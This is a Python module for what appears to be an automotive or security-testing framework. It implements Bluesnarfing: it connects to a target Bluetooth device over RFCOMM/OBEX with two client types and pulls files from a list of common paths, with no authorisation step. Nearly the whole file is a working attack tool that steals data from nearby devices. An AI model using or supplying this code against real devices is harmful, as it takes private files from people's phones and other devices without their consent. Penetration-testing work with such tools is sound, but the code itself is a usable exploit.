from autosec.core.autosec_module import AutosecModule, AutosecModuleInformation
from autosec.core.ressources.bluetooth import BluetoothService, FileData
from .bt_obex import FixedClient, FixedBrowserClient
from typing import List
import time
import os
from PyOBEX import responses

from autosec.core.ressources.base import AutosecRessource

def load_module():
    '''
    Method to provide the module to the framework
    '''
    return [BluesnarfService()]

class BluesnarfService(AutosecModule):
    '''
    Class using Bluesnarfing on a bluetooth device
    '''

    def __init__(self):
        super().__init__()

    def get_info(self):
        return AutosecModuleInformation(
            name="Bluesnarfing",
            description = "Module to get files from a bluetooth device",
            dependencies = ["PyOBEX"],
            tags = ["Bluetooth", "RFCOMM", "OBEX"]
        )
    
    def get_produced_outputs(self) -> List[FileData]:
        return [FileData]
    

    def get_required_ressources(self) -> List[AutosecRessource]:
        return [BluetoothService]
    
    
    def run(self,inputs: List[AutosecRessource]) -> List[FileData]:
        service = self.get_ressource(inputs, BluetoothService)
        if not service.get_protocol() == "RFCOMM" and not service.get_protocol() == "None":
            print("Wrong service was given")
            exit()
        address = service.get_device().get_bd_addr()
        channel = service.get_port()
        results = []
        
        bclient = FixedBrowserClient(address, channel)
        client = FixedClient(address, channel)
        clients = [bclient, client]
        for c in clients:
            try:
                time.sleep(5)  # waiting a few seconds so the port is not busy anymore
                if isinstance(c, FixedBrowserClient):
                    print("trying to bluesnarf with BrowserClient")
                else:
                    print("trying to bluesnarf with OPP Client")
                r = c.connect()
            
            except OSError as e:
                print("Connect failed. " + str(e))
                continue
            

            if isinstance(r, responses.ConnectSuccess):
                print("Connection successful")
                file = open(os.path.dirname(os.path.abspath(__file__)) + "/" + "bluesnarfing_files/common_files.txt")
                files = []
                for line in file:
                    parts = line.replace("\n", "").rsplit("/",1)
                    files.append((parts[0], parts[1]))
                
                for file_parts in files:
                    path = file_parts[0]
                    filename = file_parts[1]
                    c.setpath(path)
                    r = c.get(filename)
                    if isinstance(r, responses.UnknownResponse):
                        if r.code == 209:
                            print("Opcode is not implemented")
                        continue

                    if isinstance(r, responses.FailureResponse):
                        print("Failed to get file " + filename)
                    else:
                        headers, data = r
                        results.append(FileData(filename, data))

                c.disconnect()
                
            
            else:
                print("Connection could not be established")
                if r.code == 198:
                    print("Connection not acceptable")
                elif r.code == 211:
                    print("Service not available")
                
        
        return results